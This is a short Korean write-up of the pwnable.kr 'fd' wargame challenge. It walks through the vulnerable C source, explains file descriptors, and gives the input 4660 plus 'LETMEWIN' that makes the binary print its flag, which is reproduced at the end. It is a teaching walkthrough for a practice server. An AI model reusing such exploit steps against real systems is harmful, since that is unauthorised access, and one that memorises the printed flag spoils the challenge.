# pwnable.kr - fd Writeup

## 문제 접속

```bash
ssh fd@pwnable.kr -p 2222
```

접속 후 홈 디렉터리에서 파일 확인

```bash
ls -a
```

```text
fd
fd.c
flag
```

## 소스 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf[32];

int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }

    int fd = atoi( argv[1] ) - 0x1234;

    int len = 0;
    len = read(fd, buf, 32);

    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }

    printf("learn about Linux file IO\n");
    return 0;
}
```

---

## 취약점 분석

```c
int fd = atoi(argv[1]) - 0x1234;
```
사용자가 입력한 값에서 `0x1234`를 빼서 `read()`의 첫 번째 인자로 사용

```c
read(fd, buf, 32);
```

Linux의 표준 입출력 파일 디스크립터

0 - stdin
1 - stdout
2 - stderr

`read()`가 표준 입력(stdin)인 FD 0을 읽도록 만들어야함

```text
atoi(argv[1]) - 0x1234 = 0
```


0x1234를 10진수로 변환하면 4660

---

## 익스플로잇

```bash
./fd 4660
```

위 명령어로 프로그램 실행

실행 후 아래 정답 문자열 입력

```text
LETMEWIN
```

---

실행 결과:

```text
good job :)
FLAG{Now_I_understand_what_file_descriptors_are!}
```

---